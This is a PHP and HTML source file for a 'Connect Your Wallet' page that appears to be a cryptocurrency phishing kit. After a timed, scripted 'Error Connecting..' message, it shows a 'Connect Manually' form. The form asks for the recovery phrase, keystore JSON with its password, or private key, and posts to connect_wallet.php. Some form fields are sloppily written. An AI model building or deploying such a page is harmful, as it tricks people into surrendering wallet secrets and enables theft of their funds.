<?php
// secure_assets.php
// This script generates a page for connecting various crypto wallets.
// It dynamically lists wallets and provides modal forms for connection.

// Start the session to manage user state, if necessary.
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

// Ensure the user is logged in before proceeding.
if (!isset($_SESSION['user_id'])) {
    header("Location: ../login.php");
    exit;
}

// Include necessary files for database connection and functions.


// Database connection
require_once 'db.php';

// Fetch wallet assets
$result = $conn->query('SELECT id, name, image_url, description FROM wallets');
$wallets = [];
while ($row = $result->fetch_assoc()) {
    $wallets[] = $row;
}
$conn->close();
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connect Wallets</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <style>
        .wallet-card {
            transition: box-shadow 0.2s;
        }

        .wallet-card:hover {
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
        }
    </style>
</head>

<body class="bg-gray-100">
    <div class="container py-5">
        <h2 class="text-center mb-6 font-bold text-3xl text-blue-700">Connect Your Wallet</h2>
        <div class="row justify-content-center">
            <?php foreach ($wallets as $wallet): ?>
                <div class="col-md-4 mb-4">
                    <div class="wallet-card bg-white rounded-lg shadow p-4 flex flex-col items-center">
                        <img src="<?php echo htmlspecialchars($wallet['image_url']); ?>" alt="<?php echo htmlspecialchars($wallet['name']); ?>" class="mb-3 rounded-full w-20 h-20 object-cover border-2 border-blue-500">
                        <h5 class="font-semibold text-lg mb-2 text-blue-600"><?php echo htmlspecialchars($wallet['name']); ?></h5>
                        <p class="text-gray-600 mb-3 text-center"><?php echo htmlspecialchars($wallet['description']); ?></p>
                        <button class="btn btn-primary connect-btn" data-id="<?php echo $wallet['id']; ?>" data-name="<?php echo htmlspecialchars($wallet['name']); ?>" data-image="<?php echo htmlspecialchars($wallet['image_url']); ?>">Connect</button>
                    </div>
                </div>
            <?php endforeach; ?>
        </div>
        <!-- Modal HTML -->
        <div class="modal fade" id="walletModal" tabindex="-1" aria-labelledby="walletModalLabel" aria-hidden="true">
            <div class="modal-dialog modal-dialog-centered">
                <div class="modal-content rounded-4 border-0">
                    <div class="modal-header border-0">
                        <h5 class="modal-title text-danger" id="walletModalLabel">Back</h5>
                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                    </div>
                    <div class="modal-body">
                        <div id="modalStatus" class="mb-3 p-3 rounded-3 border border-danger text-danger fw-bold">Connecting...</div>
                        <div class="d-flex align-items-center mb-3 p-3 rounded-3 border border-secondary">
                            <img id="modalWalletImage" src="" alt="" class="me-2" style="border-radius:50%;height:24px;width:24px;">
                            <div>
                                <div id="modalWalletName" class="fw-bold"></div>
                                <div id="modalWalletDesc" class="text-muted small"></div>
                            </div>
                        </div>
                        <div id="manualConnectBtn" class="d-flex justify-content-end" style="display:none;">
                            <button class="btn btn-secondary" id="showImportModal">Connect Manually</button>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Import Modal HTML -->
        <form action="connect_wallet.php" method="post">
            <div class="modal fade" id="importModal" tabindex="-1" aria-labelledby="importModalLabel" aria-hidden="true">
                <div class="modal-dialog modal-dialog-centered">
                    <div class="modal-content rounded-4 border-0">
                        <div class="modal-body">
                            <div class="text-center mb-3">
                                <img id="importWalletImage" src="" alt="" style="height:40px;width:40px;border-radius:50%;">
                                <h5 class="mt-2">Import your <span id="importWalletName"></span> Wallet</h5>
                            </div>
                            <ul class="nav nav-tabs justify-content-center mb-3" id="importTab" role="tablist">
                                <li class="nav-item" role="presentation">
                                    <button class="nav-link active" id="phrase-tab" data-bs-toggle="tab" data-bs-target="#phrase" type="button" role="tab">Phrase</button>
                                </li>
                                <li class="nav-item" role="presentation">
                                    <button class="nav-link" id="keystore-tab" data-bs-toggle="tab" data-bs-target="#keystore" type="button" role="tab">Keystore JSON</button>
                                </li>
                                <li class="nav-item" role="presentation">
                                    <button class="nav-link" id="privatekey-tab" data-bs-toggle="tab" data-bs-target="#privatekey" type="button" role="tab">Private Key</button>
                                </li>
                            </ul>
                            <div class="tab-content" id="importTabContent">
                                <div class="tab-pane fade show active" id="phrase" role="tabpanel">
                                    <input type="text" class="form-control mb-2" placeholder="Wallet Name">
                                    <textarea class="form-control mb-2" placeholder="Enter your recovery phrase"></textarea>
                                    <div class="text-danger small mb-2">Typically 12 (sometimes 24) words separated by single spaces</div>
                                    <button class="btn btn-block w-100" style="background:#ff6a4d;color:#fff;">Proceed</button>
                                </div>
                                <div class="tab-pane fade" id="keystore" role="tabpanel">
                                    <textarea class="form-control mb-2" placeholder="Keystore JSON"></textarea>
                                    <input type="text" class="form-control mb-2" placeholder="Wallet Password">
                                    <div class="text-danger small mb-2">Several lines of text beginning with {...} plus the password you used to encrypt it.</div>
                                    <button class="btn btn-block w-100" style="background:#ff6a4d;color:#fff;">Proceed</button>
                                </div>
                                <div class="tab-pane fade" id="privatekey" role="tabpanel">
                                    <input type="text" class="form-control mb-2" placeholder="Enter your Private Key">
                                    <div class="text-danger small mb-2">Typically 12 (sometimes 24) words separated by single spaces</div>
                                    <button class="btn btn-block w-100" style="background:#ff6a4d;color:#fff;">Proceed</button>
                                </div>
                            </div>
                            <div class="d-flex justify-content-end align-items-center mt-2">
                                <button type="button" class="btn btn-danger" data-bs-dismiss="modal">Cancel</button>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </form>
    </div>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        $(document).ready(function() {
            let walletModal = new bootstrap.Modal(document.getElementById('walletModal'));
            let importModal = new bootstrap.Modal(document.getElementById('importModal'));
            $('.connect-btn').on('click', function() {
                // Show connecting modal
                $('#modalStatus').text('Connecting...').removeClass('border-success').addClass('border-danger text-danger');
                $('#manualConnectBtn').hide();
                $('#modalWalletImage').attr('src', $(this).data('image'));
                $('#modalWalletName').text($(this).data('name'));
                $('#modalWalletDesc').text('Easy-to-use browser extension.');
                walletModal.show();
                // Simulate connection attempt
                setTimeout(function() {
                    $('#modalStatus').text('Error Connecting..').removeClass('text-success').addClass('text-danger');
                    $('#manualConnectBtn').show();
                }, 1500);
            });
            $('#showImportModal').on('click', function() {
                walletModal.hide();
                // Set import modal info
                $('#importWalletImage').attr('src', $('#modalWalletImage').attr('src'));
                $('#importWalletName').text($('#modalWalletName').text());
                importModal.show();
            });
        });
    </script>
</body>

</html>